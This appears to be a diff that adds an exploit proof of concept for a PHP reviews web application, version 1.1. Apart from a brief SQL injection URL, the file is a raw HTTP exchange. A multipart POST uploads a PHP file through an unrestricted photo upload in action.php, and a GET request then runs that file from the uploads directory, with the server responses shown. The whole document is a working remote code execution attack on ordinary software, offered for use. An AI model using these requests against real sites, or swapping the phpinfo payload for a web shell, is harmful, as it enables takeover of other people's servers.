@@ -1,0 +1,84 @@
+# Exploit Title: Facebook And Google Reviews System For Businesses 1.1 - Remote Code Execution
+# Dork: N/A
+# Date: 2018-12-14
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://codecanyon.net/item/facebook-and-google-reviews-system-for-businesses/22793559
+# Version: 1.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/reviews/campaign_add.php?id=[SQL]
+# 
+
+POST /[PATH]/reviews/action.php?action=custom_reviews HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/octet-stream
+Content-Length: 922
+Referer: http://localhost/[PATH]/reviews/custom_reviews_add.php
+Cookie: PHPSESSID=t7hinqk30gq4ies69nno1lj2b0
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+-----------------------------4704926813981: undefined
+Content-Disposition: form-data; name="photo"; filename="phpinfo.php"
+<?php
+phpinfo();
+?>
+-----------------------------4704926813981
+Content-Disposition: form-data; name="hidden_photo"
+-----------------------------4704926813981
+Content-Disposition: form-data; name="name"
+Efe
+-----------------------------4704926813981
+Content-Disposition: form-data; name="rating"
+4.5
+-----------------------------4704926813981
+Content-Disposition: form-data; name="review"
+Efe
+-----------------------------4704926813981
+Content-Disposition: form-data; name="date"
+12/14/2018
+-----------------------------4704926813981
+Content-Disposition: form-data; name="id"
+-----------------------------4704926813981
+Content-Disposition: form-data; name="submit"
+submit
+-----------------------------4704926813981--
+HTTP/1.1 302 Found
+Date: Fri, 14 Dec 2018 18:17:48 GMT
+Server: Apache
+X-Powered-By: PHP/7.0.33
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+location: custom_reviews.php
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+GET /[PATH]/reviews/uploads/264082phpinfo.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: */*
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/[PATH]/reviews/custom_reviews.php
+Cookie: PHPSESSID=t7hinqk30gq4ies69nno1lj2b0
+DNT: 1
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Fri, 14 Dec 2018 18:17:49 GMT
+Server: Apache
+X-Powered-By: PHP/7.0.33
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
